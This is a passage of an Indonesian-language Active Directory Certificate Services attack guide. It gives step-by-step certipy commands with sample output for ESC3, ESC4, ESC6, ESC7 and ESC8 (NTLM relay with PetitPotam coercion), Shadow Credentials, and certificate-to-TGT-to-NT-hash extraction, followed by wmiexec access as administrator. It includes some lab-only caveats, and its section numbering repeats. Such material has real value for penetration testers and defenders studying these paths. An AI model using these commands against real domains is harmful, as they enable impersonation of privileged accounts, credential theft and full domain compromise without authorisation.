Contoh:

```text
Template Name                 : EnrollAgent
Enrollment Agent              : True
Extended Key Usage            :
    Certificate Request Agent

[+] User Enrollable Principals:
    DOMAIN\Domain Users

[!] Vulnerabilities
    ESC3 : Template has Certificate Request Agent EKU set.
```

Certipy menggunakan indikator ini untuk mendeteksi agent template.

---

# 5.2.1 Target Template

Kemudian cari template kedua:

```text
Client Authentication : True
```

dan cocok untuk enrollment-on-behalf-of.

Contoh:

```text
User
 ├── Schema Version 1
 ├── Client Authentication = True
 └── target can enroll / be enrolled by agent
```

---

# 5.3 💥 ESC3 — Two Templates Needed

## Step 1 — Obtain Enrollment Agent Certificate

```bash
# Request Enrollment Agent certificate
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -ca "$CA_NAME" \
    -template "EnrollAgent"
```

Output:

```text
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 101
[*] Got certificate with UPN 'username@domain.local'
[*] Saved certificate and private key to 'username.pfx'
```

---

## Step 2 — Request Certificate on Behalf Of Target

```bash
# Target privileged account
TARGET_USER="DOMAIN\\Administrator"

# Request certificate on behalf of target user
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -ca "$CA_NAME" \
    -template "User" \
    -pfx "username.pfx" \
    -on-behalf-of "$TARGET_USER"
```

Output realistis:

```text
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 102
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

Certipy's documented ESC3 workflow uses `-pfx` bersama `-on-behalf-of` untuk request certificate bagi target.

---

## Step 3 — Authenticate

```bash
# Authenticate with the target certificate
certipy auth \
    -pfx administrator.pfx \
    -dc-ip "$DC_IP"
```

Output:

```text
[*] Using principal: administrator@domain.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
```

---

# 🟣 6. ESC4 — VULNERABLE CERTIFICATE TEMPLATE ACL

## 6.1 🧠 Konsep ESC4

ESC4 bukan terutama:

```text
"template sudah vulnerable"
```

tetapi:

```text
"attacker dapat MODIFY template"
```

Misalnya:

```text
LOW PRIV USER
     │
     │ GenericWrite / WriteDACL / WriteOwner / FullControl
     ▼
CERTIFICATE TEMPLATE
```

Kemudian:

```text
Template
  │
  └── changed into ESC1-like configuration
```

Certipy documentation menjelaskan ESC4 sebagai template hijacking melalui ACL/template modification dan menyebut `WriteDACL`, `WriteOwner`, WriteProperty tertentu, atau Full Control sebagai kondisi yang relevan.

---

# 6.1.1 🔗 Attack Chain ESC4

```text
Low Priv User
      │
      ▼
Write access to template
      │
      ▼
Modify template
      │
      ├── Enrollee Supplies Subject
      ├── Client Authentication
      └── Enrollment permissions
      │
      ▼
ESC1-like template
      │
      ▼
Request certificate
      │
      ▼
Authentication
```

---

# 6.2 🔎 Identifikasi ESC4

Gunakan:

```bash
# Search all AD CS vulnerabilities
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout
```

Cari:

```text
Object Control Permissions
```

misalnya:

```text
Write Owner
Write DACL
Full Control
Write Property
```

Contoh:

```text
Template Name: SecureTemplate

Permissions
  Object Control Permissions
    WriteDacl:
      DOMAIN\lowprivuser

[!] Vulnerabilities
  ESC4 : User has dangerous permissions.
```

---

# 6.3 💥 Exploitation ESC4

> Gunakan hanya pada template lab yang memang berada dalam scope. Simpan konfigurasi lama sebelum melakukan perubahan.

### Step 1 — Save + Make ESC1-like Configuration

Pada Certipy modern, `-write-default-configuration` dapat mengubah template ke konfigurasi ESC1-like dan menyimpan konfigurasi sebelumnya sebagai JSON.

```bash
# Template yang dapat dimodifikasi
TEMPLATE="SecureTemplate"

# Rewrite template into an ESC1-like configuration
# Certipy also saves the previous configuration
certipy template \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -template "$TEMPLATE" \
    -write-default-configuration
```

Contoh output:

```text
Certipy v5.x

[*] Saving current configuration to 'SecureTemplate.json'
[*] Wrote current configuration for 'SecureTemplate' to 'SecureTemplate.json'
[*] Updating certificate template 'SecureTemplate'
[*] Replacing:
[*]     pKIExtendedKeyUsage
[*]     msPKI-Certificate-Name-Flag
[*]     msPKI-Enrollment-Flag
[*] Successfully updated 'SecureTemplate'
```

---

## 6.3.1 🧠 Kenapa Ini Work?

Template yang awalnya:

```text
Secure
```

berubah menjadi kira-kira:

```text
ESC1-like
```

sehingga:

```text
Attacker
   │
   ▼
Enroll
   │
   ▼
Subject/SAN controlled
   │
   ▼
Client authentication
```

Namun ada satu caveat penting:

```text
Template exists
      ≠
Template published
```

Jika template tidak dipublish oleh CA, perubahan template saja tidak otomatis membuat CA mulai menerbitkannya. Enable/publish relationship harus dianalisis terpisah.

---

## 6.3.2 Request Certificate

```bash
# Request a certificate using the now-vulnerable template
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -ca "$CA_NAME" \
    -template "$TEMPLATE" \
    -upn "administrator@$DOMAIN"
```

---

## 6.3.3 Restore Original Template

```bash
# Restore the saved pre-change configuration
certipy template \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -template "$TEMPLATE" \
    -write-configuration "$TEMPLATE.json" \
    -no-save
```

Certipy documentation merekomendasikan save/restore configuration saat menguji ESC4.

---

# 🔵 7. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

## 7.1 🧠 Konsep ESC6

ESC6 bukan template-level issue.

Ia berada di:

```text
Certificate Authority
```

CA memiliki flag:

```text
EDITF_ATTRIBUTESUBJECTALTNAME2
```

Secara konseptual:

```text
CA
 │
 └── allows request attributes
          │
          └── arbitrary SAN
```

SpecterOps mendeskripsikan ESC6 sebagai kondisi CA yang mengizinkan arbitrary SAN request attribute dan pada dasarnya memberikan efek seperti Enrollee Supplies Subject pada template yang dipublish CA.

---

# ⚠️ 7.1.1 Important Modern Caveat

Ini sangat penting:

> Pada environment yang sudah patched/modern dengan strong certificate mapping, **ESC6 tidak lagi cukup sendirian** untuk menghasilkan privilege escalation dalam banyak skenario.

Certipy juga mendokumentasikan bahwa setelah perubahan terkait strong certificate mapping/CVE-2022-26923, ESC6 sendiri tidak lagi cukup dan dapat memerlukan kombinasi attack path lain.

Jadi mindset:

```text
ESC6 detected
     ≠
DA guaranteed
```

---

# 7.2 🔎 Identifikasi ESC6

Gunakan:

```bash
# Enumerate CA configuration
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout
```

Cari indikasi:

```text
EDITF_ATTRIBUTESUBJECTALTNAME2
```

atau vulnerability section yang mengarah ke ESC6.

---

# 7.2.1 🔍 Manual Concept

CA-level configuration:

```text
Certificate Authority
       │
       └── EditFlags
              │
              └── EDITF_ATTRIBUTESUBJECTALTNAME2
```

---

# 7.3 💥 Exploitation ESC6

Pada **lab yang memang disiapkan untuk ESC6 dan mapping-nya memungkinkan**, request certificate dengan SAN/UPN dapat diuji menggunakan `certipy req`.

```bash
# Request a certificate while supplying an alternative UPN
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -ca "$CA_NAME" \
    -template "User" \
    -upn "administrator@$DOMAIN"
```

Kemudian:

```bash
# Test certificate authentication
certipy auth \
    -pfx administrator.pfx \
    -dc-ip "$DC_IP"
```

Jika mendapatkan:

```text
[*] Trying to get TGT...
[-] ...
```

jangan langsung menyimpulkan request gagal.

Periksa:

```text
1. Certificate mapping
2. SID extension
3. CA policy
4. Template EKU
5. PKINIT compatibility
```

---

# 🟤 8. ESC7 — VULNERABLE CA ACL

## 8.1 🧠 Konsep ESC7

ESC7 berada pada **CA permissions**, bukan sekadar template permissions.

Contoh:

```text
LOW PRIV USER
      │
      │ ManageCA
      ▼
Certificate Authority
      │
      ├── change CA configuration
      ├── manage templates
      └── manage requests/issuance
```

Certipy menampilkan permission seperti:

```text
ManageCA
ManageCertificates
Enroll
Read
```

pada CA information.

---

# 8.1.1 🧩 ManageCA vs ManageCertificates

```text
ManageCA
    │
    └── control/configuration level CA permissions

ManageCertificates
    │
    └── certificate request approval/management
```

Jangan anggap keduanya identik.

---

# 8.2 🔎 Identifikasi ESC7

```bash
# Enumerate CA permissions and vulnerabilities
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout
```

Contoh:

```text
Certificate Authorities
  0
    CA Name              : CORP-CA
    DNS Name             : ca.corp.local

    Permissions
      Access Rights
        ManageCA         : CORP.LOCAL\Domain Users
        ManageCertificates: CORP.LOCAL\Certificate Managers
        Read             : CORP.LOCAL\Domain Users
        Enroll           : CORP.LOCAL\Domain Users

    [!] Vulnerabilities
      ESC7 : User has dangerous permissions.
```

Certipy menampilkan ESC7 pada kondisi CA permissions yang berbahaya.

---

# 8.3 💥 ESC7 — ManageCA Abuse

Gunakan `certipy ca` untuk membaca konfigurasi dan, pada lab yang sesuai, melakukan CA-management action.

```bash
# Show CA help and supported options
certipy ca -h
```

Listing templates:

```bash
# List enabled templates on the CA
certipy ca \
    -ca "$CA_NAME" \
    -list-templates
```

Contoh output:

```text
Certificate Templates:
  User
  Machine
  DomainController
  SecureTemplate
```

Dokumentasi Certipy saat ini menunjukkan `ca -list-templates`, `-enable-template`, `-disable-template`, `-issue-request`, `-deny-request`, dan `-add-officer` sebagai operasi CA yang tersedia tergantung hak yang dimiliki.

---

## 8.3.1 🧠 Attack Chain ESC7

Secara konsep:

```text
ManageCA
    │
    ▼
CA control
    │
    ├── enable suitable template
    │
    ├── manage certificate requests
    │
    └── combine with another ESC path
             │
             ▼
       certificate issuance
```

Contoh:

```text
ESC7
  │
  ▼
Enable/use vulnerable template
  │
  ▼
ESC1-like path
  │
  ▼
Certificate
  │
  ▼
Authentication
```

---

# 🔐 8.3.2 Manage Certificates Path

Jika memiliki hak yang sesuai:

```bash
# Issue a pending certificate request
REQUEST_ID="42"

certipy ca \
    -ca "$CA_NAME" \
    -issue-request "$REQUEST_ID"
```

Concept:

```text
Pending Request
      │
      ▼
ManageCertificates
      │
      ▼
Issue
      │
      ▼
Certificate
```

---

# 🌐 9. ESC8 — NTLM RELAY TO AD CS HTTP ENROLLMENT

## 9.1 🧠 Konsep ESC8

ESC8 terjadi ketika AD CS memiliki enrollment interface berbasis HTTP/HTTPS yang dapat menerima authentication dan dapat menjadi target NTLM relay dalam konfigurasi yang rentan.

Architecture:

```text
Victim / DC
     │
     │ NTLM authentication
     ▼
ATTACKER
     │
     │ relay
     ▼
AD CS WEB ENROLLMENT
     │
     ▼
Certificate
```

Ini langsung berhubungan dengan:

→ [**File 41: NTLM Relay**](https://chatgpt.com/41-ntlm-relay/<a href="/docs/ntlm-relay" class="text-[#00b4d8] hover:underline font-mono font-semibold">41_ntlm_relay_workflow.md</a>)

Certipy secara resmi mendukung relay ke AD CS HTTP(S) endpoints untuk ESC8.

---

# 9.1.1 🖥️ AD CS Web Enrollment

Endpoint klasik:

```text
/certsrv/
```

Contoh:

```text
http://ca.corp.local/certsrv/
```

atau:

```text
https://ca.corp.local/certsrv/
```

---

# 9.1.2 🔄 ESC8 vs File 41

File 41:

```text
NTLM Relay
```

File 40:

```text
ESC8
```

Relasinya:

```text
              NTLM Relay Primitive
                     │
             ┌───────┴────────┐
             │                │
             ▼                ▼
       File 41            ESC8
      General Relay    Relay → AD CS
```

Jadi ESC8 bukan konsep yang sepenuhnya baru.

Ini adalah:

```text
NTLM Relay
     +
AD CS Web Enrollment
     =
ESC8
```

---

# 9.2 🔎 Identifikasi ESC8

## Certipy

```bash
# Search CA configuration for Web Enrollment / ESC8 indicators
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout |
    grep -i -E "web enrollment|ESC8"
```

---

## Manual

```bash
# Test HTTP Web Enrollment endpoint
curl -k \
    -i \
    "http://CA-IP/certsrv/"
```

Perhatikan response:

```text
HTTP/1.1 401 Unauthorized
WWW-Authenticate: NTLM
```

Namun:

```text
WWW-Authenticate: NTLM
```

saja belum membuktikan exploitability end-to-end.

Harus dianalisis:

```text
1. HTTP enrollment tersedia
2. NTLM diterima
3. Relay path dapat mencapai endpoint
4. Certificate template cocok
5. Victim identity dapat menghasilkan usable certificate
6. Certificate mapping/policy tidak memblokir hasilnya
```

GitHub issue Certipy juga menunjukkan bahwa endpoint behavior seperti `403`, authentication behavior, template availability, and downstream mapping can affect whether an apparent ESC8 finding actually works.

---

# 9.2.1 Contoh Output

```text
[*] Certificate Authorities
    CA Name: CORP-CA
    DNS Name: CA.CORP.LOCAL
    Web Enrollment: Enabled

[!] Vulnerabilities
    ESC8 : Web Enrollment is enabled ...
```

---

# 9.3 💥 Exploitation ESC8

> Gunakan hanya pada lab/CTF yang memang menyediakan relay scenario.

Certipy relay modern menggunakan target URL untuk AD CS endpoint. Dokumentasi command reference menunjukkan bentuk `certipy relay -target protocol://host`, dengan `-template` opsional/required depending target identity.

```bash
# CA hostname
CA_HOST="ca.domain.local"

# Start AD CS relay listener against the HTTP enrollment endpoint
certipy relay \
    -target "http://$CA_HOST" \
    -template "DomainController"
```

Contoh output:

```text
Certipy v5.x

[*] Listening on 0.0.0.0:445
[*] Targeting http://ca.domain.local/certsrv/
[*] Waiting for incoming NTLM connections...
```

---

# 9.3.1 Trigger Authentication

Pada lab:

```text
COERCION
   │
   ▼
Victim/DC
   │
   │ NTLM authentication
   ▼
Attacker relay listener
   │
   ▼
AD CS HTTP
```

Contoh tool-specific trigger dapat berasal dari workflow coercion yang sudah dibahas:

```bash
# LHOST = IP attacker (di mana relay listener certipy berjalan)
# TARGET = IP DC atau machine yang mau di-coerce
LHOST="10.10.14.x"
TARGET="10.10.10.x"  # Target Machine / DC IP

python3 PetitPotam.py "$LHOST" "$TARGET"
```

Setelah menerima authentication:

```text
[*] Received connection
[*] Authenticating as DOMAIN\DC$
[*] Requesting certificate
[*] Successfully requested certificate
[*] Saving certificate and private key
```

---

# 9.3.2 Gunakan Certificate

Jika relay menghasilkan PFX:

```bash
# Authenticate using the certificate
certipy auth \
    -pfx "dc01.pfx" \
    -dc-ip "$DC_IP"
```

Strong mapping dapat menjadi post-relay blocker.

---

# 👥 10. SHADOW CREDENTIALS (`certipy shadow`)

## 10.1 🧠 Konsep Shadow Credentials

Shadow Credentials adalah teknik eksploitasi di mana attacker yang memiliki akses Write pada objek akun AD (User atau Computer) menambahkan sertifikat baru ke atribut **`msDS-KeyCredentialLink`** milik objek tersebut.

```text
Attacker (punya WriteDACL/GenericAll pada Target User/Computer)
      │
      │ 1. certipy shadow auto (generate cert + edit msDS-KeyCredentialLink)
      ▼
Target Object di Active Directory (msDS-KeyCredentialLink updated)
      │
      │ 2. certipy req / certipy auth (PKINIT auth via certificate)
      ▼
Kerberos TGT + NT Hash (UnPAC-Key)
```

### Keunggulan Shadow Credentials:
- **Tidak butuh Certificate Template / CA vulnerable**: Hanya mengeksploitasi atribut Active Directory bawaan (`msDS-KeyCredentialLink`).
- **Bisa menghasilkan NT Hash**: Melalui proses PKINIT Kerberos auth, attacker bisa mendapatkan NT Hash milik akun target.
- **Sangat relevan di CTF/HTB Modern**: Alternatif utama jika tidak ada AD CS CA yang vulnerable tetapi ada AD ACL abuse path.

---

## 10.2 💥 Eksploitasi Shadow Credentials

```bash
# 1. Tambahkan Key Credential baru & dapatkan NT Hash target secara otomatis:
certipy shadow auto \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -account "target_user" \
    -dc-ip "$DC_IP"

# 2. Setelah selesai, hapus Key Credential untuk kebersihan (OpSec):
certipy shadow remove \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -account "target_user" \
    -dc-ip "$DC_IP"
```

---

# 🧩 11. ESC5 - ESC15 OVERVIEW (RINGKASAN KONSEP)

Selain ESC1-ESC8 yang sering diuji, AD CS memiliki attack path tingkat lanjut (ESC9 - ESC15) dan konfigurasi vulnerable CA (ESC5). Berikut ringkasan konseptualnya:

| Vulnerability | Deskripsi Ringkas | Konsep / Penyebab Utama |
|---|---|---|
| **ESC5** | PKI Object Access Control Abuse | ACL berbahaya pada objek PKI Active Directory (seperti CA container, OID container, AIA/CDP) yang memungkinkan attacker mengubah konfigurasi CA atau mempublikasikan template baru. |
| **ESC9** | No `msPKI-Cert-Template-OID` Requirement | Template yang mendukung `Strong Certificate Binding` tetapi tidak mewajibkan OID template khusus, sehingga memungkinkan impersonasi pengguna via UPN modification tanpa terdeteksi validation engine standar. |
| **ESC10** | Strong Certificate Binding Disabled | Registry setting pada Domain Controller (`StrongCertificateBindingEnforcement` set ke 0) yang mematikan pemetaan ketat SID/UPN sertifikat ke akun AD. |
| **ESC11** | NTLM Relay ke RPC / ICPR | Relay NTLM authentication langsung ke RPC Interface AD CS (`ICPR` protocol) ketika ENCRYPTED_RPC tidak diwajibkan oleh CA. |
| **ESC12** | Shell-on-CA via CA Control | Attacker yang mengontrol server CA (misal via AD CS Backup Key/certutil) dapat mengekstrak CA Private Key dan melakukan certificate forging (`certipy forge`). |
| **ESC13** | Group Policy OID Abuse | Template menerbitkan sertifikat yang memuat OID khusus yang dipetakan oleh Group Policy untuk memberikan akses khusus (misal Admin Rights pada host tertentu). |
| **ESC14** | Explicit Certificate Mapping Abuse | Eksploitasi pemetaan sertifikat manual pada objek user (`altSecurityIdentities`) di Active Directory. |
| **ESC15** | Application Policy Abuse | Eksploitasi kustom EKU / Application Policy yang dapat disalahgunakan untuk melompati proteksi EKU standar. |

> **Pointer Referensi Lanjutan**: Untuk detail mendalam mengenai ESC9-ESC15, gunakan command `certipy find -vulnerable` versi terbaru dan merujuk pada dokumentasi resmi [Certipy (ly4k/Certipy)](https://github.com/ly4k/Certipy) dan riset AD CS dari SpecterOps.

---

# 🔐 10. PKINIT & CERTIFICATE → TGT → HASH

## 10.1 🧠 Pahami Format Credential Dulu

Sebelum command:

```text
PFX
 │
 ├── certificate
 └── private key
```

Setelah PKINIT:

```text
PFX
 │
 ▼
TGT
 │
 ▼
CCACHE
```

Format Windows:

```text
TGT
 │
 ▼
KIRBI
```

Kemudian dalam kondisi tertentu:

```text
TGT + Session Key
       │
       ▼
     UnPAC
       │
       ▼
     NT Hash
```

---

# 10.1.1 🎟️ Method 1 — Certipy Auth

```bash
# Authenticate directly with PFX
certipy auth \
    -pfx "administrator.pfx" \
    -dc-ip "$DC_IP"
```

Output:

```text
[*] Using principal: administrator@domain.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
```

---

# 10.1.2 🐍 Method 2 — gettgtpkinit.py

```bash
# Request Kerberos TGT using certificate/private key
python3 gettgtpkinit.py \
    -cert-pfx "administrator.pfx" \
    "$DOMAIN/administrator" \
    administrator.ccache
```

Concept:

```text
administrator.pfx
       │
       ▼
gettgtpkinit.py
       │
       ▼
PKINIT
       │
       ▼
administrator.ccache
```

---

# 10.2 🔓 Get NTLM Hash dari Certificate

Perlu dipahami:

```text
Certificate
    │
    ▼
TGT
    │
    ▼
Session Key
    │
    ▼
UnPAC
    │
    ▼
NT Hash
```

Ini bukan:

```text
certificate → hash
```

secara langsung.

Ada intermediate Kerberos exchange.

---

# 10.2.1 getnthash.py

```bash
# Kerberos session key returned by gettgtpkinit.py
KEY="TGT-SESSION-KEY"

# Recover the NT hash using UnPAC-the-hash
python3 getnthash.py \
    -key "$KEY" \
    "$DOMAIN/administrator"
```

Output:

```text
[*] Getting NT hash for administrator
[+] NT hash:
31d6cfe0d16ae931b73c59d7e0c089c0
```

---

# 10.2.2 ⚠️ Tidak Semua Certificate Menghasilkan Hash

Kondisi dapat gagal karena:

```text
- PKINIT unavailable
- wrong certificate mapping
- no suitable U2U path
- account restrictions
- missing session information
- patched environment
```

Jadi:

```text
PFX
 ↓
PKINIT
```

adalah langkah utama.

```text
PKINIT
 ↓
UnPAC
```

adalah langkah lanjutan.

---

# 10.3 🗂️ Gunakan ccache dari Certipy

```bash
# Set Kerberos credential cache
export KRB5CCNAME="$PWD/administrator.ccache"

# Verify ticket
klist
```

Output:

```text
Credentials cache: FILE:/home/user/administrator.ccache
Principal: administrator@DOMAIN.LOCAL

Valid starting       Expires
09/08/2026 14:00     09/09/2026 00:00
```

Kemudian:

```bash
# Example: use Kerberos authentication with Impacket
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$DC_IP"
```

---

# 🧭 11. ESC QUICK REFERENCE TABLE

|ESC|Nama|Prerequisite|Tool|Dampak|
|---|---|---|---|---|
|**ESC1**|Enrollee Supplies Subject|Enrollment + SAN/subject control + auth EKU|`certipy req`|Potensi impersonation / privilege escalation|
|**ESC2**|Any Purpose / No EKU|Enrollment ke Any Purpose/no-EKU template|`certipy req`|Flexible certificate; dapat menjadi agent path|
|**ESC3**|Certificate Request Agent|Agent certificate + suitable target template|`certipy req -on-behalf-of`|Request certificate atas nama user lain|
|**ESC4**|Template Hijacking|Write/ACL control terhadap template|`certipy template`|Convert secure template menjadi exploitable|
|**ESC6**|EDITF_ATTRIBUTESUBJECTALTNAME2|CA-level SAN request attribute + compatible mapping|`certipy req`|Arbitrary SAN pada CA-level|
|**ESC7**|Vulnerable CA ACL|ManageCA / ManageCertificates|`certipy ca`|CA/config/request abuse|
|**ESC8**|NTLM Relay to HTTP Enrollment|Vulnerable Web Enrollment + relay position|`certipy relay`|Obtain certificate for relayed identity|
|**ESC8 + modern mapping caveat**|Relay succeeds but auth fails|Strong mapping/SID policy|`certipy relay` + `auth`|Relay artifact may not authenticate|

**Catatan penting:**

```text
ESC number
   │
   └── hanya memberi nama kondisi
```

Bukan:

```text
ESC1 = selalu DA
ESC8 = selalu shell
```

Actual impact tetap tergantung:

```text
identity
+
template
+
CA
+
mapping
+
ACL
+
policy
```

---

# 🌳 12. DECISION TREE AD CS

```text
                    ┌─────────────────────┐
                    │   certipy find      │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ AD CS candidate?    │
                    └──────────┬──────────┘
                               │
                 ┌─────────────┼─────────────┐
                 │             │             │
                 ▼             ▼             ▼
               ESC1          ESC2          ESC3
                 │             │             │
                 ▼             ▼             ▼
          SAN/Subject       Any Purpose   Agent cert
          + Client Auth        │             │
                 │             │             │
                 ▼             ▼             ▼
             req -upn       obtain cert   Template A
                 │             │             │
                 ▼             ▼             ▼
             cert auth    Agent capability  Template B
                 │                           │
                 ▼                           ▼
               TGT                       on-behalf-of
                 │                           │
                 └───────────┬───────────────┘
                             ▼
                         PFX / TGT
                             │
                             ▼
                        Authentication
```

Kemudian:

```text
                    certipy find
                         │
               ┌─────────┼──────────┐
               │         │          │
               ▼         ▼          ▼
             ESC4      ESC6       ESC7
               │         │          │
               ▼         ▼          ▼
           Write      CA flag     CA ACL
          Template      │          │
               │        ▼          ▼
               ▼    SAN request  CA action
           Modify        │          │
          template      ▼          ▼
               │       auth/use another ESC
               ▼
              ESC1-like
```

Dan:

```text
                    certipy find
                         │
                         ▼
                       ESC8?
                         │
                         ▼
                Web Enrollment
                         │
                         ▼
                    NTLM Relay
                         │
                         ▼
                      PFX
                         │
                         ▼
                     cert auth
                         │
                  ┌──────┴──────┐
                  ▼             ▼
                Success       Mapping
                               fails
```

---

# 🎯 12.1 Decision Tree Praktis

## ESC1

```text
ESC1?
 │
 YES
 │
 ▼
Can I enroll?
 │
 ├── NO → no direct path
 │
 └── YES
       │
       ▼
Can certificate authenticate?
       │
       ├── NO → inspect EKU/template
       │
       └── YES
             │
             ▼
Can target identity be mapped?
             │
             ├── NO → inspect strong mapping
             │
             └── YES
                   │
                   ▼
                req -upn
```

---

## ESC2

```text
Any Purpose?
     │
    YES
     │
     ▼
Can I enroll?
     │
     ▼
Obtain certificate
     │
     ▼
Is it useful as Enrollment Agent?
     │
     ▼
Find target template
```

---

## ESC3

```text
Enrollment Agent?
       │
      YES
       │
       ▼
Template A → Agent Certificate
       │
       ▼
Template B → allows target enrollment
       │
       ▼
-on-behalf-of
       │
       ▼
Target certificate
```

---

## ESC4

```text
Can write template?
       │
  ┌────┴─────┐
 YES         NO
  │           │
  ▼           ▼
Modify      other ESC
template
  │
  ▼
ESC1-like
configuration
  │
  ▼
Request cert
```

---

## ESC6

```text
CA has SAN request flag?
       │
      YES
       │
       ▼
Check mapping/policy
       │
       ▼
Request SAN
       │
       ▼
Certificate
```

---

## ESC7

```text
ManageCA?
   │
  YES
   │
   ▼
Inspect CA
   │
   ├── template management
   ├── request management
   └── CA control
```

---

## ESC8

```text
Web Enrollment?
      │
     YES
      │
      ▼
NTLM accepted?
      │
     YES
      │
      ▼
Can relay victim authentication?
      │
     YES
      │
      ▼
Certificate issuance
      │
      ▼
Certificate mapping works?
      │
 ┌────┴─────┐
 YES         NO
  │           │
  ▼           ▼
auth        analyze
```

---

# 🧯 13. COMMON ERRORS & TROUBLESHOOTING

|Error|Penyebab|Solusi|
|---|---|---|
|`KDC has no support for padata type`|PKINIT/pre-auth mechanism tidak sesuai atau certificate/target tidak mendukung flow|Periksa template EKU, certificate mapping, CA/KDC support|
|`Certificate request failed`|Template, permission, CA policy, atau request invalid|Periksa `certipy find` dan template properties|
|`Certificate unknown`|Identity/certificate mapping tidak cocok|Periksa UPN/SID/issuer/mapping|
|`The request contains no certificate template information`|Request tidak menyertakan template yang valid|Pastikan `-template` benar dan template dipublish|
|`KRB_AP_ERR_SKEW`|Clock terlalu berbeda|Sinkronkan waktu dengan DC|
|`LDAP connection failed`|DC unreachable / LDAP blocked / wrong IP|Periksa routing, DNS, TCP 389/636|
|`PFX authentication failed`|PFX rusak, password PFX salah, mapping gagal|Inspect PFX dan certificate identity|
|`Got error while trying to request TGT`|PKINIT gagal|Periksa certificate, EKU, principal, DC, mapping|
|`Template not found`|Nama template salah / tidak dipublish|Ambil nama dari `certipy find`|
|`Enrollment failed`|User tidak punya enrollment rights|Periksa Enrollment Permissions|
|`CA tidak bisa di-reach`|CA host/RPC/DCOM unreachable|Check DNS, SMB/RPC, firewall|
|`Web enrollment menolak request`|IIS/CS policy/auth issue|Test `/certsrv/`, HTTP status, template|
|`NTLM relay gagal`|Endpoint hardened atau relay chain tidak cocok|Verifikasi HTTP enrollment, NTLM, channel binding, mapping|
|`Object SID mismatch`|Certificate identity tidak cocok dengan AD object|Gunakan identity/SID yang benar dan pahami strong mapping|
|`Name mismatch between certificate and user`|Certificate SAN/UPN/DNS tidak cocok dengan principal|Periksa target identity dan mapping|
|`CERTSRV_E_UNSUPPORTED_CERT_TYPE`|Template tidak didukung/dipublish oleh CA|Pastikan template tersedia pada CA|
|`CERTSRV_E_BAD_RENEWAL_SUBJECT`|Request-on-behalf-of tidak sesuai issuance requirements|Periksa authorized signature / agent policy|
|`rpc_s_access_denied`|User tidak memiliki CA permission yang dibutuhkan|Periksa ManageCA/ManageCertificates|
|`KRB_AP_ERR_TKT_EXPIRED`|Ticket expired|Request TGT/TGS baru|
|`KDC_ERR_C_PRINCIPAL_UNKNOWN`|Account principal salah|Periksa `DOMAIN\USER` / UPN|
|`KDC_ERR_S_PRINCIPAL_UNKNOWN`|SPN/target service salah|Periksa SPN|
|`KDC_ERR_PREAUTH_FAILED`|Credential/key salah|Verifikasi password/hash/certificate|
|`HTTP 401`|Authentication required|Normal pada beberapa deployment, tetapi perlu melihat auth scheme|
|`HTTP 403`|Access denied/policy restriction|Periksa IIS, authentication, authorization|
|`HTTP 200` tetapi relay gagal|Endpoint reachable bukan berarti relayable|Periksa NTLM negotiation dan target path|
|`Saved PFX tetapi cert auth gagal`|Issuance sukses tetapi mapping/auth gagal|Bedakan issuance dengan authentication|

---

# ⏰ 13.1 Clock Skew

Check local time:

```bash
# Show local time
date

# Show NTP/time synchronization state
timedatectl
```

Pada lab:

```bash
# Option 1 - rdate (Sangat fleksibel di lab)
sudo rdate -n "$DC_IP"

# Option 2 - timedatectl & net time (systemd)
sudo timedatectl set-ntp false
sudo date -s "$(net time -S $DC_IP 2>/dev/null | tail -1)"

# Option 3 - faketime (Bypass tanpa mengubah system clock OS)
faketime "$(net time -S $DC_IP 2>/dev/null)" certipy auth -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP"
```

Kemudian:

```bash
# Verify
date
```

Mental model:

```text
Kerberos error?
      │
      ▼
Check clock FIRST
```

---

# 📜 13.2 Inspect PFX

Gunakan OpenSSL:

```bash
# Inspect certificate inside PFX
openssl pkcs12 \
    -in administrator.pfx \
    -info \
    -nodes
```

Cari:

```text
Subject
Issuer
Validity
Extended Key Usage
Subject Alternative Name
```

Contoh:

```text
subject=CN=Administrator
issuer=CN=CORP-CA
X509v3 Extended Key Usage:
    Client Authentication
X509v3 Subject Alternative Name:
    UPN:administrator@domain.local
```

---

# 🎫 13.3 PFX Berhasil Dibuat tetapi `certipy auth` Gagal

Jangan langsung ulang request.

Gunakan reasoning:

```text
PFX created
   │
   ▼
Certificate valid?
   │
   ├── NO → request problem
   │
   └── YES
         │
         ▼
Identity correct?
         │
         ▼
EKU usable?
         │
         ▼
Mapping accepted?
         │
         ▼
PKINIT allowed?
```

---

# 🔐 13.4 Strong Certificate Mapping Problem

Error seperti:

```text
Name mismatch between certificate and user
```

atau:

```text
Object SID mismatch
```

dapat menunjukkan bahwa certificate yang secara visual memiliki UPN target tetap tidak diterima sebagai target tersebut.

Mental model:

```text
Certificate says:
Administrator
       │
       ▼
